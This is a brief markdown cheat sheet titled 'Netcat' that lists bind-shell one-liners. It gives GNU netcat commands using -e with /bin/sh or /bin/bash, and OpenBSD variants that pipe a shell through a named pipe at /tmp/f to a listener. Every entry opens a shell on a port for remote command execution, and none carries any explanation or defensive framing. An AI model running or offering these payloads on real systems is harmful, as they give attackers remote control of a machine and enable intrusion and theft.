# Netcat

## 01 - GNU

`$ nc -lnvp <PORT> -e /bin/sh`

`$ nc -lnvp <PORT> -e /bin/bash`

## 02 - OpenBSD

`$ mkfifo /tmp/f; (nc -lp <PORT> ||nc -l <PORT>)0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

`$ mkfifo /tmp/f; (nc -lp <PORT> ||nc -l <PORT>)0</tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f`